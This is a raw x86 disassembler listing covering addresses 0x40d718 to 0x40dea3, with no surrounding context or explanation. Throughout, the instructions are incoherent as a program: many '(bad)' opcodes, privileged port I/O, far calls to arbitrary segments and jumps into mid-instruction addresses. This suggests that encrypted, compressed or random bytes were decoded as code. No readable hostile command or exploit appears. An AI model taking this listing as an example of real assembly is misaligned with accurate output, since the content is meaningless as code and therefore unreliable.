  40d718:	test   ah,bl
  40d71a:	retf   
  40d71b:	je     0x40d745
  40d71d:	and    al,al
  40d71f:	dec    ecx
  40d720:	ins    BYTE PTR es:[edi],dx
  40d721:	sub    BYTE PTR [edx],0xfe
  40d724:	aas    
  40d725:	ja     0x40d6b7
  40d727:	xor    bh,BYTE PTR [ebp-0x6c31b959]
  40d72d:	(bad)  
  40d72e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d72f:	dec    ecx
  40d730:	cwde   
  40d731:	cdq    
  40d732:	lahf   
  40d733:	fnstenv ds:0xbe56dbe3
  40d739:	test   eax,0x496c67f5
  40d73e:	js     0x40d783
  40d740:	nop
  40d741:	sub    al,0x3f
  40d743:	adc    ecx,DWORD PTR [esi+eax*1-0x6b]
  40d747:	gs retf 
  40d749:	test   dh,al
  40d74b:	push   cs
  40d74c:	push   ds
  40d74d:	xchg   ebp,eax
  40d74e:	mov    ds:0xceca4200,al
  40d753:	leave  
  40d754:	mov    al,0x9a
  40d756:	dec    esp
  40d757:	scas   al,BYTE PTR es:[edi]
  40d758:	into   
  40d759:	mov    dh,0x2
  40d75b:	mov    ebp,DWORD PTR [eax]
  40d75d:	or     eax,0x59fb9d39
  40d762:	xor    edi,DWORD PTR [eax-0x2735eb69]
  40d768:	fistp  WORD PTR [esi+esi*8+0x653063b]
  40d76f:	out    dx,eax
  40d770:	and    DWORD PTR [esp+edx*8],ebp
  40d773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d774:	add    eax,0x651f5dde
  40d779:	sub    DWORD PTR [esi],esi
  40d77b:	jno    0x40d745
  40d77d:	ss jne 0x40d7df
  40d780:	mov    esp,0x8dd52258
  40d785:	mov    esi,DWORD PTR [ebx+0x22]
  40d788:	mov    esp,0xd7197328
  40d78d:	mov    ds:0x52571aee,eax
  40d792:	jg     0x40d75c
  40d794:	sub    eax,DWORD PTR [ebx-0x42]
  40d797:	xor    ah,BYTE PTR [ecx]
  40d799:	pop    esi
  40d79a:	fsubr  DWORD PTR [edi+0x2c]
  40d79d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d79e:	xor    BYTE PTR [esi],bl
  40d7a0:	mov    edx,0x26def4ba
  40d7a5:	mov    BYTE PTR [edi],cl
  40d7a7:	jmp    0x40d775
  40d7a9:	js     0x40d829
  40d7ab:	mov    esi,0x21b06691
  40d7b0:	sbb    DWORD PTR [eax-0xa3cefcb],ebp
  40d7b6:	xchg   esp,eax
  40d7b7:	es push 0xa2464ffe
  40d7bd:	aad    0x88
  40d7bf:	rcl    cl,0x3f
  40d7c2:	leave  
  40d7c3:	loopne 0x40d7ae
  40d7c5:	push   ebp
  40d7c6:	stos   DWORD PTR es:[edi],eax
  40d7c7:	jns    0x40d77e
  40d7c9:	int3   
  40d7ca:	jge    0x40d803
  40d7cc:	mov    eax,ds:0x3e20073
  40d7d1:	cwde   
  40d7d2:	push   eax
  40d7d3:	cmp    dl,cl
  40d7d5:	or     edx,DWORD PTR ds:0x32086e2c
  40d7db:	(bad)  
  40d7dd:	adc    ebx,eax
  40d7df:	loopne 0x40d84f
  40d7e1:	dec    edx
  40d7e2:	sbb    BYTE PTR [eax+0x1308e951],ch
  40d7e8:	jp     0x40d845
  40d7ea:	repnz mov al,0xec
  40d7ed:	xor    DWORD PTR [edx-0x6735c887],ebp
  40d7f3:	add    al,0xe6
  40d7f5:	and    al,0x47
  40d7f7:	hlt    
  40d7f8:	mov    dl,0x9b
  40d7fa:	inc    ecx
  40d7fb:	inc    eax
  40d7fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7fd:	loop   0x40d81e
  40d7ff:	mov    BYTE PTR [edi],ah
  40d801:	dec    ebx
  40d802:	je     0x40d7c8
  40d804:	pop    ebx
  40d805:	ja     0x40d839
  40d807:	retf   0xca02
  40d80a:	pusha  
  40d80b:	shr    BYTE PTR [ebx-0x57],1
  40d80e:	xor    BYTE PTR [esi],bh
  40d810:	out    0x4a,al
  40d812:	jmp    0x40d87b
  40d814:	int3   
  40d815:	pusha  
  40d816:	dec    ebp
  40d817:	lods   eax,DWORD PTR ds:[esi]
  40d818:	sar    DWORD PTR [ebx-0x32],0x18
  40d81c:	cmp    eax,0xea187db6
  40d821:	test   al,0x27
  40d823:	and    BYTE PTR [edi-0x62],ah
  40d826:	ins    DWORD PTR es:[edi],dx
  40d827:	mov    edx,0x8ee688d4
  40d82c:	xchg   edx,eax
  40d82d:	mov    BYTE PTR [ebp+0x4d26a29a],ch
  40d833:	xor    al,0x71
  40d835:	xchg   ebx,eax
  40d836:	sub    dh,BYTE PTR [ebp+0x77]
  40d839:	addr16 enter 0x66fc,0xc0
  40d83e:	add    al,0x93
  40d840:	jmp    0x40d85e
  40d842:	and    eax,0x33d54cea
  40d847:	push   es
  40d848:	adc    cl,dh
  40d84a:	lahf   
  40d84b:	cwde   
  40d84c:	pop    edi
  40d84d:	cmp    eax,0xf3815943
  40d852:	stc    
  40d853:	addr16 inc eax
  40d855:	ins    BYTE PTR es:[edi],dx
  40d856:	fs out 0x2e,eax
  40d859:	retf   
  40d85a:	arpl   bp,si
  40d85c:	mov    ebp,0xfffd27d0
  40d861:	add    bh,BYTE PTR [ecx-0x64f798df]
  40d867:	adc    ah,BYTE PTR [edi+0x4e]
  40d86a:	inc    esi
  40d86b:	pop    ds
  40d86c:	jns    0x40d82e
  40d86e:	pop    es
  40d86f:	out    0x56,al
  40d871:	icebp  
  40d872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d873:	jg     0x40d8df
  40d875:	jne    0x40d83e
  40d877:	push   esp
  40d878:	xlat   BYTE PTR ds:[ebx]
  40d879:	jmp    0x40d7fb
  40d87b:	dec    esi
  40d87c:	fidiv  WORD PTR ds:0xe204b3a8
  40d882:	pop    esp
  40d883:	imul   ebx,DWORD PTR [eax],0xf57adcf
  40d889:	cs adc DWORD PTR gs:[eax-0x4b],esi
  40d88e:	test   eax,0xe93a55de
  40d894:	mov    dh,BYTE PTR [edx]
  40d896:	xchg   ebx,eax
  40d897:	xor    ah,BYTE PTR [ecx]
  40d899:	mov    cl,0x95
  40d89b:	pop    ebp
  40d89c:	or     al,BYTE PTR [ebp-0x15f41ded]
  40d8a2:	pop    es
  40d8a3:	mov    es,ebx
  40d8a5:	int    0x57
  40d8a7:	xor    ch,BYTE PTR [eax]
  40d8a9:	or     BYTE PTR [ecx+0x15],dh
  40d8ac:	test   eax,0x4c3554ff
  40d8b1:	call   0x132f:0xa9494a3e
  40d8b8:	jnp    0x40d91c
  40d8ba:	sub    BYTE PTR [eax],dl
  40d8bc:	aam    0xa5
  40d8be:	retf   
  40d8bf:	pop    edi
  40d8c0:	icebp  
  40d8c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8c2:	pop    eax
  40d8c3:	and    al,BYTE PTR [edx+ebx*4]
  40d8c6:	mov    esp,0x1cb07334
  40d8cb:	aad    0xc4
  40d8cd:	add    al,0x96
  40d8cf:	mov    dh,0x78
  40d8d1:	ins    BYTE PTR es:[edi],dx
  40d8d2:	ins    DWORD PTR es:[edi],dx
  40d8d3:	and    edx,DWORD PTR [eax]
  40d8d5:	sbb    BYTE PTR ds:0x58c88f27,ah
  40d8db:	in     al,dx
  40d8dc:	mov    al,ds:0xa460cd2
  40d8e1:	pop    ecx
  40d8e2:	in     eax,0x37
  40d8e4:	aam    0x1d
  40d8e6:	pop    esi
  40d8e7:	pop    edi
  40d8e8:	inc    edx
  40d8e9:	(bad)  
  40d8ea:	call   0xbfd5:0x44de05f5
  40d8f1:	adc    al,0xc9
  40d8f3:	dec    ebp
  40d8f4:	aam    0x9b
  40d8f6:	push   0x2d1b2e18
  40d8fb:	push   0x36
  40d8fd:	pop    edi
  40d8fe:	mov    esp,DWORD PTR [edi-0x6748d3b1]
  40d904:	sub    al,bl
  40d906:	mov    ecx,0xb32d34af
  40d90b:	ins    DWORD PTR es:[edi],dx
  40d90c:	jo     0x40d8ba
  40d90e:	sub    cl,BYTE PTR [ebp-0x3b496e2d]
  40d914:	jecxz  0x40d984
  40d916:	add    ebx,DWORD PTR [edi+0x60]
  40d919:	loopne 0x40d916
  40d91b:	push   eax
  40d91c:	jle    0x40d96c
  40d91e:	lea    esp,[edx]
  40d920:	inc    ecx
  40d921:	mov    edx,0xaf9fa354
  40d926:	mov    eax,0xb7dd60d6
  40d92b:	(bad)  
  40d92c:	push   esi
  40d92d:	test   dh,al
  40d92f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40d931:	dec    esi
  40d932:	mov    al,ds:0xafcb173f
  40d937:	push   ss
  40d938:	mov    ds,WORD PTR ds:0xb88d0681
  40d93e:	mul    DWORD PTR [ebx]
  40d940:	aas    
  40d941:	and    ch,BYTE PTR [esi+eiz*4]
  40d944:	xchg   ebp,eax
  40d945:	mov    eax,ds
  40d947:	mov    ebx,DWORD PTR [ebp-0x353af4d8]
  40d94d:	inc    eax
  40d94e:	test   DWORD PTR [ebp-0x37fd3dab],ecx
  40d954:	xor    eax,0xe28e34c
  40d959:	add    eax,0xca3dc687
  40d95e:	dec    esi
  40d95f:	gs jmp 0x84cd:0x981ace43
  40d967:	cmp    bl,BYTE PTR [eax+0x56]
  40d96a:	push   eax
  40d96b:	push   ecx
  40d96c:	jb     0x40d94b
  40d96e:	mov    dh,0x63
  40d970:	es mov edx,0xf0afbcbf
  40d976:	outs   dx,BYTE PTR ds:[esi]
  40d977:	pop    esi
  40d978:	and    DWORD PTR [esi+0x2d],0x7d
  40d97c:	es hlt 
  40d97e:	gs das 
  40d980:	bound  ecx,QWORD PTR [eax+0xc]
  40d983:	and    bh,dh
  40d985:	xchg   ebx,eax
  40d986:	mov    DWORD PTR [ecx+0x6cc11b67],ebp
  40d98c:	add    al,0x3
  40d98e:	sbb    eax,0xfe5b4337
  40d993:	scas   eax,DWORD PTR es:[edi]
  40d994:	test   WORD PTR [ebx+0x18],bp
  40d998:	jg     0x40da14
  40d99a:	mov    ds,edx
  40d99c:	add    dh,BYTE PTR [esp+edx*4+0x58]
  40d9a0:	sub    BYTE PTR [ecx],ch
  40d9a2:	sub    DWORD PTR [edx+0x4b78a9bf],ecx
  40d9a8:	jbe    0x40da27
  40d9aa:	jmp    0x40da02
  40d9ac:	retf   0x89f2
  40d9af:	data16 mov ah,0xa8
  40d9b2:	lahf   
  40d9b3:	adc    ah,0xd5
  40d9b6:	clc    
  40d9b7:	fcmovbe st,st(0)
  40d9b9:	pop    edi
  40d9ba:	mov    ah,bl
  40d9bc:	inc    eax
  40d9bd:	inc    edi
  40d9be:	ins    BYTE PTR es:[edi],dx
  40d9bf:	mov    esp,0x4a8baaee
  40d9c4:	xlat   BYTE PTR ds:[ebx]
  40d9c5:	xor    edx,ecx
  40d9c7:	xchg   dh,ah
  40d9c9:	sbb    esi,DWORD PTR [edx]
  40d9cb:	je     0x40d951
  40d9cd:	call   0xb73fe379
  40d9d2:	xchg   edi,eax
  40d9d3:	jns    0x40d98b
  40d9d5:	inc    edx
  40d9d6:	cmp    al,0x2e
  40d9d8:	test   eax,0xd9d47ce3
  40d9dd:	sub    dh,dh
  40d9df:	push   ss
  40d9e0:	push   eax
  40d9e1:	cmp    al,0x7f
  40d9e3:	inc    esi
  40d9e4:	(bad)
  40d9e8:	push   ebx
  40d9e9:	leave  
  40d9ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9eb:	sbb    eax,0x3fc1417c
  40d9f0:	aam    0x52
  40d9f2:	je     0x40da1c
  40d9f4:	popf   
  40d9f5:	ret    0xda13
  40d9f8:	jge    0x40da20
  40d9fa:	ins    DWORD PTR es:[edi],dx
  40d9fb:	inc    edi
  40d9fc:	pop    esp
  40d9fd:	xchg   edi,eax
  40d9fe:	test   al,0xb0
  40da00:	call   0x6e2b1aa6
  40da05:	xor    BYTE PTR [ecx+0x3f2c7853],0xbe
  40da0c:	ds mov ah,0x3d
  40da0f:	fwait
  40da10:	mov    ecx,0x97d6d3b
  40da15:	hlt    
  40da16:	test   BYTE PTR [ebx],0x4f
  40da19:	rcr    DWORD PTR [esi-0x7e],0x1
  40da1d:	int3   
  40da1e:	jno    0x40da0d
  40da20:	ret    0xb4a5
  40da23:	out    0xf3,al
  40da25:	in     al,dx
  40da26:	bound  edi,QWORD PTR [ebx]
  40da28:	test   DWORD PTR [esp-0xc],esi
  40da2c:	mul    al
  40da2e:	daa    
  40da2f:	jecxz  0x40da8c
  40da31:	js     0x40da7e
  40da33:	pop    ds
  40da34:	sbb    al,0xf4
  40da36:	mov    ch,0x75
  40da38:	add    al,0x2d
  40da3a:	xchg   edi,eax
  40da3b:	adc    DWORD PTR [ecx+ebx*2-0x1a],eax
  40da3f:	mov    bl,0x66
  40da41:	mov    ebp,0xb0e79814
  40da46:	or     DWORD PTR [edx+0xe0f1759],0xb007817c
  40da50:	jne    0x40da6a
  40da52:	retf   
  40da53:	sar    DWORD PTR [ecx],0x1c
  40da56:	cs pop eax
  40da58:	les    esp,FWORD PTR [ebx]
  40da5a:	adc    DWORD PTR [ebx+0x7d],esi
  40da5d:	push   ds
  40da5e:	mov    BYTE PTR [ebx+0x4956790a],ch
  40da64:	imul   edi,DWORD PTR ds:0xd14676e0,0x3a
  40da6b:	mov    esp,ebx
  40da6d:	push   eax
  40da6e:	xor    BYTE PTR [ebx+0x46],ah
  40da71:	ficom  WORD PTR [ecx+edi*8-0x6ef3fc65]
  40da78:	shl    BYTE PTR [edx-0x67],cl
  40da7b:	fucomi st,st(1)
  40da7d:	lahf   
  40da7e:	frstor [ebp+ebp*4+0x2b2b1157]
  40da85:	pop    ss
  40da86:	jle    0x40da40
  40da88:	xor    eax,0xe307033f
  40da8d:	(bad)  
  40da8e:	call   0x8653:0x95cfcfcc
  40da95:	test   eax,0x4f1515d8
  40da9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9b:	mov    cl,0x72
  40da9d:	push   edi
  40da9e:	push   edi
  40da9f:	fist   WORD PTR [ebp-0x2fefe624]
  40daa5:	gs out dx,eax
  40daa7:	sti    
  40daa8:	pushf  
  40daa9:	icebp  
  40daaa:	pop    eax
  40daab:	xor    eax,DWORD PTR [ebx]
  40daad:	mov    bh,0x93
  40daaf:	sbb    al,0xa9
  40dab1:	into   
  40dab2:	bswap  edi
  40dab4:	(bad)  
  40dab6:	xchg   esp,eax
  40dab7:	cld    
  40dab8:	sbb    BYTE PTR ds:0xa6632ce2,0xab
  40dabf:	(bad)  
  40dac0:	aaa    
  40dac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dac2:	jnp    0x40db3e
  40dac4:	lahf   
  40dac5:	mov    edx,0x751a4933
  40daca:	jp     0x40da7c
  40dacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dacd:	xlat   BYTE PTR ds:[ebx]
  40dace:	scas   eax,DWORD PTR es:[edi]
  40dacf:	pop    ebp
  40dad0:	cmc    
  40dad1:	push   ecx
  40dad2:	fidiv  DWORD PTR [esi]
  40dad4:	jb     0x40db27
  40dad6:	pop    esp
  40dad7:	out    0xb0,al
  40dad9:	push   es
  40dada:	sbb    ecx,ebx
  40dadc:	das    
  40dadd:	fistp  DWORD PTR [ecx+ecx*4-0x2a]
  40dae1:	adc    edi,DWORD PTR [esi+0x74]
  40dae4:	xor    edi,ebp
  40dae6:	call   0x2284:0x1534a440
  40daed:	cmp    al,0x8a
  40daef:	pop    ds
  40daf0:	push   edx
  40daf1:	sbb    DWORD PTR [ebp+0x37],ebp
  40daf4:	sbb    eax,0xa668601e
  40daf9:	into   
  40dafa:	imul   esp,DWORD PTR [eax*4+0xa1245da],0x1bfeca50
  40db05:	mov    BYTE PTR [ebp+0x7b737149],dl
  40db0b:	dec    eax
  40db0c:	jg     0x40daf4
  40db0e:	es cmp eax,0xac676f0a
  40db14:	mov    ds:0xa5e5b490,eax
  40db19:	xchg   BYTE PTR [ebp-0x2b8e7351],ch
  40db1f:	push   ss
  40db20:	outs   dx,DWORD PTR ds:[esi]
  40db21:	or     eax,0x98e49ca5
  40db26:	mov    ds:0x8053975e,al
  40db2b:	call   0xbcab:0xa341d9d6
  40db32:	pop    es
  40db33:	mov    ch,0x63
  40db35:	fs mov ch,0x42
  40db38:	cdq    
  40db39:	inc    eax
  40db3a:	add    BYTE PTR [ebx-0x3e666802],dh
  40db40:	shl    bh,0xfc
  40db43:	mov    ecx,DWORD PTR [eax-0x3815af6f]
  40db49:	loopne 0x40db5c
  40db4b:	mov    esi,0xe425e1da
  40db50:	dec    eax
  40db51:	xchg   ecx,eax
  40db52:	das    
  40db53:	ins    DWORD PTR es:[edi],dx
  40db54:	es icebp 
  40db56:	cmc    
  40db57:	cmp    DWORD PTR [edx],edx
  40db59:	iret   
  40db5a:	pop    ds
  40db5b:	push   ss
  40db5c:	push   0xffffffa3
  40db5e:	mov    ds:0x8e617a4d,al
  40db63:	loope  0x40dbc7
  40db65:	inc    esp
  40db66:	shl    BYTE PTR [eax+esi*8+0x3e],0xe0
  40db6b:	or     DWORD PTR [ebx],ebp
  40db6d:	sti    
  40db6e:	imul   edi,DWORD PTR [edi-0x14],0xe837f06
  40db75:	sbb    DWORD PTR [ebx-0x51e75029],edi
  40db7b:	pusha  
  40db7c:	or     ebx,DWORD PTR [edi+0x19]
  40db7f:	mov    ecx,ecx
  40db81:	cwde   
  40db82:	jns    0x40db63
  40db84:	and    bl,0x75
  40db87:	cmc    
  40db88:	ds es aas 
  40db8b:	aad    0x35
  40db8d:	add    DWORD PTR [eax-0x46],ecx
  40db90:	mov    esp,esp
  40db92:	sar    DWORD PTR [edx+0x57d6518a],0xe
  40db99:	ret    0x5f30
  40db9c:	data16 sbb bh,BYTE PTR [eax]
  40db9f:	scas   al,BYTE PTR es:[edi]
  40dba0:	and    BYTE PTR [ecx],dh
  40dba2:	(bad)  
  40dba4:	sti    
  40dba5:	ins    BYTE PTR es:[edi],dx
  40dba6:	push   ecx
  40dba7:	jbe    0x40dc11
  40dba9:	or     ecx,DWORD PTR [ecx+0x6e]
  40dbac:	lock call 0xd860bfef
  40dbb2:	aam    0x21
  40dbb4:	sub    ch,BYTE PTR [esi-0x54886dbb]
  40dbba:	imul   esi,esi,0x21
  40dbbd:	adc    dl,BYTE PTR [eax+0x4d]
  40dbc0:	dec    esp
  40dbc1:	inc    ecx
  40dbc2:	pop    ebx
  40dbc3:	sar    BYTE PTR [esi+0x46d99bbd],1
  40dbc9:	mov    al,0xdc
  40dbcb:	clc    
  40dbcc:	push   esi
  40dbcd:	mov    ebp,0x95aff6ce
  40dbd2:	imul   ebx,DWORD PTR [ebx-0x66357910],0x68cef7d
  40dbdc:	pop    ds
  40dbdd:	sub    BYTE PTR [ebp-0x21339588],0x29
  40dbe4:	lea    ecx,[ebx-0x7c8d9566]
  40dbea:	not    edx
  40dbec:	out    dx,al
  40dbed:	mov    ss,WORD PTR ds:0x6fb3dac6
  40dbf3:	rcr    esp,1
  40dbf5:	mov    eax,0x4f96ab4
  40dbfa:	in     eax,0x22
  40dbfc:	pushf  
  40dbfd:	dec    BYTE PTR [ebp-0x6a]
  40dc00:	push   ebp
  40dc01:	mov    al,0x11
  40dc03:	jmp    ebx
  40dc05:	dec    BYTE PTR [esp+ecx*8+0xf63961a]
  40dc0c:	call   0xa1e4:0x6c6782ce
  40dc13:	fsubr  DWORD PTR [ebp-0x8d76c94]
  40dc19:	lock xor DWORD PTR [esi-0x163c390],0xffffff8f
  40dc21:	mov    ds:0x270d99b1,al
  40dc26:	mov    ebp,0x4ac580cb
  40dc2b:	sbb    esp,ecx
  40dc2d:	pusha  
  40dc2e:	xor    ebx,DWORD PTR [ebp+0x5284788]
  40dc34:	popa   
  40dc35:	fdivr  QWORD PTR [ebp+eiz*2-0x7f]
  40dc39:	xchg   edi,eax
  40dc3a:	add    BYTE PTR [edx+0x30],dh
  40dc3d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40dc3f:	inc    cx
  40dc41:	outs   dx,DWORD PTR ds:[esi]
  40dc42:	int    0x58
  40dc44:	xor    al,BYTE PTR [eax-0x3e]
  40dc47:	push   ecx
  40dc48:	scas   al,BYTE PTR es:[edi]
  40dc49:	dec    ecx
  40dc4a:	pop    edx
  40dc4b:	pop    bx
  40dc4d:	outs   dx,DWORD PTR ds:[esi]
  40dc4e:	or     edi,DWORD PTR [ebp+0x9]
  40dc51:	jb     0x40dc07
  40dc53:	jmp    0xaeb0dec
  40dc58:	fmul   DWORD PTR [ebp+edi*8-0x5]
  40dc5c:	lods   eax,DWORD PTR ds:[esi]
  40dc5d:	xchg   eax,ebx
  40dc5f:	xchg   bh,cl
  40dc61:	jo     0x40dc73
  40dc63:	mov    edx,0x61d42850
  40dc68:	mov    bh,0xd0
  40dc6a:	dec    esp
  40dc6b:	add    DWORD PTR [edx+0x676b2f12],ebp
  40dc71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc72:	jecxz  0x40dc25
  40dc74:	pop    eax
  40dc75:	aaa    
  40dc76:	loop   0x40dcdb
  40dc78:	mov    ch,0xfc
  40dc7a:	aad    0x18
  40dc7c:	loop   0x40dcd0
  40dc7e:	mov    al,0xa8
  40dc80:	xchg   ebx,eax
  40dc81:	mov    dh,0x4c
  40dc83:	mov    ds:0x5b25f47a,eax
  40dc88:	inc    esp
  40dc89:	mov    dl,0x87
  40dc8b:	imul   edi,DWORD PTR [edx],0x36
  40dc8e:	js     0x40dc87
  40dc90:	dec    eax
  40dc91:	cmp    al,0x13
  40dc93:	(bad)  
  40dc94:	out    0xce,al
  40dc96:	pop    esi
  40dc97:	push   esi
  40dc98:	ja     0x40dd09
  40dc9a:	sar    BYTE PTR [edx+0x763aef34],0x4a
  40dca1:	pop    ebp
  40dca2:	or     al,bh
  40dca4:	clc    
  40dca5:	test   BYTE PTR [esi+0x2e],ch
  40dca8:	je     0x40dc6e
  40dcaa:	aam    0xc4
  40dcac:	rcr    BYTE PTR [ebp-0x1a],1
  40dcaf:	dec    ebp
  40dcb0:	xor    BYTE PTR [edi+edi*2-0x61afb4af],bh
  40dcb7:	mov    eax,0xa66eae7c
  40dcbc:	in     eax,dx
  40dcbd:	mov    bl,0x25
  40dcbf:	test   al,0xd9
  40dcc1:	out    0x86,eax
  40dcc3:	mov    eax,0x38f9296c
  40dcc8:	(bad)  
  40dcc9:	cld    
  40dcca:	nop
  40dccb:	cmp    DWORD PTR [ebx+0x29],0xffffffa9
  40dccf:	lds    eax,FWORD PTR [esi]
  40dcd1:	jmp    0xe044284a
  40dcd6:	ja     0x40dcc9
  40dcd8:	cmc    
  40dcd9:	pop    es
  40dcda:	jae    0x40dd16
  40dcdc:	sbb    eax,0x162a3808
  40dce1:	push   ss
  40dce2:	stos   DWORD PTR es:[di],eax
  40dce4:	fldenv [ebp-0x7d]
  40dce7:	mov    DWORD PTR [ebx-0x51],ebp
  40dcea:	xor    bh,ch
  40dcec:	mov    edi,0x15960698
  40dcf1:	inc    esi
  40dcf2:	inc    esi
  40dcf3:	mov    dh,0xb7
  40dcf5:	mov    al,ds:0x3db8debf
  40dcfa:	jae    0x40dccc
  40dcfc:	cli    
  40dcfd:	shr    BYTE PTR [esi],1
  40dcff:	stos   DWORD PTR es:[edi],eax
  40dd00:	sub    ebx,edi
  40dd02:	fsub   QWORD PTR [ecx]
  40dd04:	inc    dx
  40dd06:	mov    ch,0xdf
  40dd08:	xor    ah,bl
  40dd0a:	shr    DWORD PTR ds:0x803c0235,0x84
  40dd11:	iret   
  40dd12:	scas   eax,DWORD PTR es:[edi]
  40dd13:	sub    bl,al
  40dd15:	xchg   ecx,eax
  40dd16:	fs dec esi
  40dd18:	aad    0x62
  40dd1a:	lock dec edx
  40dd1c:	cmp    ch,cl
  40dd1e:	(bad)  
  40dd20:	mov    ebp,0xc2d7bac0
  40dd25:	mov    esp,0xe7fb168b
  40dd2a:	out    dx,eax
  40dd2b:	out    dx,eax
  40dd2c:	inc    eax
  40dd2d:	ficomp DWORD PTR [ebp-0x261b2b75]
  40dd33:	pand   mm6,mm2
  40dd36:	push   ecx
  40dd37:	icebp  
  40dd38:	push   cs
  40dd39:	sbb    dl,bh
  40dd3b:	sti    
  40dd3c:	pop    ds
  40dd3d:	jnp    0x40dd3d
  40dd3f:	jl     0x40dd0a
  40dd41:	lds    ebx,FWORD PTR [edx-0x59]
  40dd44:	mov    dh,0xf4
  40dd46:	push   ebx
  40dd47:	addr16 dec ebx
  40dd49:	push   edi
  40dd4a:	retf   
  40dd4b:	pop    edx
  40dd4c:	push   esp
  40dd4d:	push   0x77431d2e
  40dd52:	push   0xc7960d99
  40dd57:	arpl   WORD PTR [ebx+eax*8-0x632f4ce4],sp
  40dd5e:	gs inc esi
  40dd60:	js     0x40dd4d
  40dd62:	pcmpeqw mm1,QWORD PTR [edx]
  40dd65:	or     al,cl
  40dd67:	(bad)  
  40dd68:	jmp    0xd6bc8911
  40dd6d:	imul   edx,DWORD PTR ds:0xa789970c,0x1dee5c5c
  40dd77:	es cdq 
  40dd79:	mov    eax,0x1d2789e3
  40dd7e:	std    
  40dd7f:	(bad)  
  40dd80:	dec    esp
  40dd81:	mov    al,0xac
  40dd83:	loope  0x40dd08
  40dd85:	out    0x57,al
  40dd87:	int    0xc6
  40dd89:	and    al,0x95
  40dd8b:	fs sahf 
  40dd8d:	das    
  40dd8e:	(bad)  
  40dd8f:	out    0x32,al
  40dd91:	xchg   edx,eax
  40dd92:	div    BYTE PTR [edx]
  40dd94:	push   0x1f
  40dd96:	out    dx,eax
  40dd97:	mov    ebp,ss
  40dd99:	ss jecxz 0x40dd68
  40dd9c:	mov    ah,0x84
  40dd9e:	mov    BYTE PTR [ebx-0x8bda0f7],ah
  40dda4:	sbb    eax,0x1994eb26
  40dda9:	imul   esp,DWORD PTR [edi-0x54],0xb0848367
  40ddb0:	nop
  40ddb1:	mov    bl,0x7f
  40ddb3:	adc    eax,DWORD PTR [ecx-0x11]
  40ddb6:	dec    ecx
  40ddb7:	mov    ah,0x85
  40ddb9:	das    
  40ddba:	fisub  WORD PTR [edi]
  40ddbc:	call   0xa375c13
  40ddc1:	addr16 jg 0x40ddf9
  40ddc4:	mov    cl,0x22
  40ddc6:	ror    BYTE PTR [edi+0x2c],cl
  40ddc9:	lods   eax,DWORD PTR ds:[esi]
  40ddca:	xchg   ecx,eax
  40ddcb:	push   ss
  40ddcc:	cli    
  40ddcd:	addr16 pop esi
  40ddcf:	adc    esp,DWORD PTR [ebx-0x479a5358]
  40ddd5:	and    eax,0xa30e60bb
  40ddda:	mov    ebx,0x6d716138
  40dddf:	xor    BYTE PTR [ecx+0x34],0xf6
  40dde3:	adc    al,0xdb
  40dde5:	loope  0x40de46
  40dde7:	xor    al,0x46
  40dde9:	(bad)  
  40ddea:	dec    eax
  40ddeb:	(bad)  
  40ddec:	ins    BYTE PTR es:[edi],dx
  40dded:	retf   0xf2a6
  40ddf0:	popf   
  40ddf1:	popa   
  40ddf2:	push   edi
  40ddf3:	pop    es
  40ddf4:	fist   WORD PTR [eax-0x5e6fcde6]
  40ddfa:	aam    0x32
  40ddfc:	imul   ebx,esp,0x67
  40ddff:	xlat   BYTE PTR ds:[ebx]
  40de00:	les    eax,FWORD PTR [eax]
  40de02:	or     bp,WORD PTR [ebp+0x4a6de8ca]
  40de09:	dec    edx
  40de0a:	pushf  
  40de0b:	lds    dx,DWORD PTR [edi]
  40de0e:	xchg   ah,bl
  40de10:	adc    DWORD PTR [edx-0x2c],0xffffffe3
  40de14:	jle    0x40de42
  40de16:	pusha  
  40de17:	(bad)  
  40de18:	int    0xa5
  40de1a:	xchg   BYTE PTR [ebp-0x73dbeddd],dh
  40de20:	shr    BYTE PTR [eax+0x6c],0xf1
  40de24:	aas    
  40de25:	cmp    esi,DWORD PTR [eax]
  40de27:	xor    eax,0x11a6f1ef
  40de2c:	mov    DWORD PTR [ecx-0x25],ebp
  40de2f:	adc    DWORD PTR [ebx+0x7e],0x4f
  40de33:	push   0xffffffeb
  40de35:	das    
  40de36:	in     al,0x86
  40de38:	jbe    0x40de16
  40de3a:	fdivr  DWORD PTR [edx+0x16]
  40de3d:	lods   eax,DWORD PTR ds:[esi]
  40de3e:	(bad)  
  40de3f:	out    0x5,eax
  40de41:	pop    edx
  40de42:	jns    0x40ddc8
  40de44:	mov    ds:0x3e323852,eax
  40de49:	mov    ds:0xe6c7e8c7,eax
  40de4e:	in     al,0x77
  40de50:	fisub  DWORD PTR gs:[edi]
  40de53:	jmp    0x1fbc033c
  40de58:	outs   dx,DWORD PTR ds:[esi]
  40de59:	inc    ebx
  40de5a:	loop   0x40de2b
  40de5c:	sub    BYTE PTR [eax],bh
  40de5e:	ror    eax,cl
  40de60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de61:	(bad)  
  40de62:	mov    al,0x74
  40de64:	setg   BYTE PTR [edx-0x648c79f9]
  40de6b:	mov    ds:0x7010164b,eax
  40de71:	int    0x38
  40de73:	(bad)  
  40de74:	addr16 loop 0x40dece
  40de77:	push   ebx
  40de78:	mov    ecx,0xddc96ea5
  40de7d:	call   0x7e116e8e
  40de82:	lods   al,BYTE PTR ds:[esi]
  40de83:	push   ss
  40de84:	cmp    ebp,esi
  40de86:	xor    bh,BYTE PTR [ebp+ebp*1+0x12]
  40de8a:	icebp  
  40de8b:	popa   
  40de8c:	imul   esp,ecx,0x1741c22a
  40de92:	and    bh,al
  40de94:	xchg   edx,eax
  40de95:	fcomp  QWORD PTR [eax-0x14eceae0]
  40de9b:	call   0x40ac417d
  40dea0:	daa    
  40dea1:	repz leave 
  40dea3:	repnz pop esi
